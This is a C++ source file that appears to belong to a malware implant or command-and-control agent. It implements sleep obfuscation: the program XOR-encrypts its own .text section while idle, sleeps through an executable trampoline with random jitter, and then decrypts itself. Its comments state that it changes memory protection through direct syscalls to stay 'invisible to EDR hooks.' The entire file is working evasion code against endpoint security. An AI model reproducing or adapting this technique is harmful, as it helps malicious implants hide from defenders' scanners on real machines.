#include "SleepObfusc.h"
#include "DirectSyscall.h"
#include <cstdlib>
#include <ctime>

// ── Find .text section of the current module ─────────────────────────────────

static bool FindTextSection(PVOID* outBase, DWORD* outSize) {
    HMODULE hMe = GetModuleHandleA(NULL);
    auto* dos = (PIMAGE_DOS_HEADER)hMe;
    auto* nt  = (PIMAGE_NT_HEADERS)((BYTE*)hMe + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            *outBase = (BYTE*)hMe + sec->VirtualAddress;
            *outSize = sec->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// ── Persistent Sleep trampoline stub ─────────────────────────────────────────
// Allocated ONCE, reused every ObfuscatedSleep call.
// x64 stub (12 bytes):
//   48 B8 xx xx xx xx xx xx xx xx   mov rax, <Sleep ptr>
//   FF E0                            jmp rax   ; rcx (ms) already set by caller

static void* g_sleepStub = nullptr;

static void* GetSleepStub() {
    if (g_sleepStub) return g_sleepStub;

    BYTE stub[12] = {
        0x48, 0xB8, 0,0,0,0, 0,0,0,0,  // mov rax, Sleep
        0xFF, 0xE0                       // jmp rax
    };
    DWORD64 fnAddr = (DWORD64)(void*)Sleep;
    memcpy(stub + 2, &fnAddr, 8);

    g_sleepStub = VirtualAlloc(NULL, sizeof(stub),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (g_sleepStub) memcpy(g_sleepStub, stub, sizeof(stub));
    return g_sleepStub;
}

// ── NtProtectVirtualMemory via direct syscall ─────────────────────────────────
// Used to flip .text protection without going through EDR-hooked VirtualProtect.
static bool _SyscallProtect(void* addr, SIZE_T len, DWORD prot, DWORD* oldProt) {
    int ssn = DirectSyscall::GetSSN(NT_PROTECT_VIRTUAL_MEM);
    if (ssn < 0) return VirtualProtect(addr, len, prot, oldProt) != 0;
    PVOID  base = (PVOID)((ULONG_PTR)addr & ~(ULONG_PTR)0xFFF);
    SIZE_T sz   = ((ULONG_PTR)addr + len + 0xFFF - (ULONG_PTR)base) & ~(SIZE_T)0xFFF;
    ULONG  old  = 0;
    NTSTATUS st = DirectSyscall::Exec(ssn,
        (ULONG_PTR)GetCurrentProcess(),
        (ULONG_PTR)&base, (ULONG_PTR)&sz,
        (ULONG_PTR)prot,  (ULONG_PTR)&old);
    if (oldProt) *oldProt = (DWORD)old;
    return st >= 0;
}

// ── XOR the section in-place ──────────────────────────────────────────────────

static const BYTE XOR_KEY[] = {
    0xB4, 0xDB, 0x4B, 0x3A, 0xF0, 0x1E, 0xC2, 0x77,
    0x9D, 0x55, 0x6A, 0x83, 0x2F, 0xE1, 0x48, 0xCC
};

static void XorSection(PVOID base, DWORD size) {
    BYTE* p = (BYTE*)base;
    for (DWORD i = 0; i < size; i++)
        p[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];
}

// ── ObfuscatedSleep ───────────────────────────────────────────────────────────

void SleepObfusc::ObfuscatedSleep(DWORD ms, DWORD ms_jitter) {
    if (ms_jitter > 0) {
        static bool seeded = false;
        if (!seeded) { srand((unsigned)time(NULL)); seeded = true; }
        ms += (DWORD)(rand() % (ms_jitter + 1));
    }

    PVOID textBase = NULL;
    DWORD textSize = 0;
    if (!FindTextSection(&textBase, &textSize)) {
        Sleep(ms);
        return;
    }

    void* stub = GetSleepStub();
    if (!stub) { Sleep(ms); return; }

    // Flip .text to RW via direct syscall — invisible to EDR hooks.
    DWORD oldProt = 0;
    if (!_SyscallProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
        Sleep(ms);
        return;
    }
    XorSection(textBase, textSize);

    // Sleep via the trampoline — ms in rcx, trampoline jmps to Sleep(rcx).
    ((void(*)(DWORD))stub)(ms);

    // Decrypt .text, then restore protection via direct syscall.
    XorSection(textBase, textSize);
    _SyscallProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);
}
